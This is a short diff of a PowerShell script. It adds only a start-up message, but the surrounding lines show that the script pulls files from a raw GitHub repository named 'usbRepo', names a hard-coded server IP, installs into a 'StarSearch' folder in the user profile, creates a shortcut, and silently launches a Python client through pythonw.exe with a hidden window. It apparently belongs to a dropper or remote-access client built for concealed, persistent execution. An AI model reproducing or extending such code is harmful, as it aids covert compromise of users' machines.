@@ -1,3 +1,4 @@
+Write-Host "Script started"
 $SourcePath="https://raw.githubusercontent.com/stxrman404/usbRepo/"
 $ServerIP="31.48.79.68"
 $InstallPath="$env:USERPROFILE\StarSearch"
@@ -28,4 +29,5 @@ $sc.WorkingDirectory=$InstallPath
 $sc.Save()
 $client=Join-Path $InstallPath "client.py"
 if(Test-Path $client){Start-Process pythonw.exe -ArgumentList "`"$client`"" -WindowStyle Hidden}
+
 
